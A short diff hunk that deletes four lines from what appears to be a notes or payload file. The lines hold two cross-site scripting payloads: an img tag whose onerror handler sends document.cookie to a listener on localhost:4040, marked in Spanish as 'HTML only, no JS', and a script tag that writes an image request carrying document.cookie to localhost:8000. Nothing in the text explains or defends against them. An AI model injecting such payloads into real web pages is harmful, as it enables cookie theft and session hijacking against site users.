@@ -1,4 +1,0 @@
-<img src="x" onerror="this.src='http://localhost:4040?cookie='+document.cookie"> -- SIN JS SOLO HTML
-
-
-<script>document.write("<img src='http://localhost:8000/?C="+document.cookie+"'>");</script>
